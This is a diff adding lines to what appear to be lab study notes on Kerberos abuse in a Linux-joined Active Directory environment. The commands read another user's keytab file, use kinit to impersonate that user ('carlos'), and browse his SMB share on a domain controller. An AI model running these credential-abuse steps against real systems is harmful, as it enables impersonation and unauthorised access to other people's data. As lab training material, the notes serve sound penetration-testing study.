@@ -538,3 +538,18 @@ $ crontab -l
 $ env | grep -i krb5
 $ ls -la /tmp
 ```
+%% reviewing environment variables for ccache files %%
+
+```
+$ klist -k -t /opt/specialfiles/carlos.keytab 
+```
+%% listing keytab file information %%
+
+```
+$ klist
+$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+$ klist
+$ smbclient //dc01/carlos -k -c ls
+```
+%% impersonating carlos using kinit then accessing shared folder as carlos %%
+
